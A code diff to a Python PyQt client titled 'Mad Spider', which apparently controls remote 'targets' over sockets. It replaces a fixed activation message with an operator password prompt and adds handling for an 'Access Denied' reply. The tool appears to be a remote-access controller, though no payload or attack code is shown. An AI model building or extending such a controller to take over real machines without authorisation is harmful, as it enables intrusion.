@@ -235,6 +235,7 @@ class MainDialog(QWidget, gui.Ui_Form):
 
     # connect to client
     def connectSocket(self):
+
         try:
             self.sockind = int(self.socketsList.currentItem().text().split('-')[1]) - 1
         except:
@@ -246,7 +247,16 @@ class MainDialog(QWidget, gui.Ui_Form):
 
             self.statusok('Send Activate message', self.lineno())
             # Send activate message to target
-            self.Send('Activate')
+            # self.Send('Activate')
+            dlg = QInputDialog(self)
+            dlg.setInputMode(QInputDialog.TextInput)
+            dlg.setWindowTitle('Password Protection')
+            dlg.setLabelText('Enter Password: ')
+            dlg.setOkButtonText('Create')
+            dlg.setCancelButtonText('Cancel')
+            dlg.setStyleSheet(style.popupDialog)
+            ok = dlg.exec_()
+            self.Send(dlg.textValue())
 
             try:
                 self.statusok('Recieve activate message from target', self.lineno())
@@ -254,6 +264,9 @@ class MainDialog(QWidget, gui.Ui_Form):
                 self.data = self.Receive()
 
                 if self.data != '':
+                    if self.data == 'Access Denied':
+                        print self.data
+                        raise socket.error
                     self.displayText(msg=self.data.split('XORXORXOR13')[0])
                     self.setWindowTitle('Mad Spider - Client - Connected to %s' % str(self.sockItems[self.sockind]))
                     self.statusok('Connected to {}'.format(str(self.sockItems[self.sockind])), self.lineno())
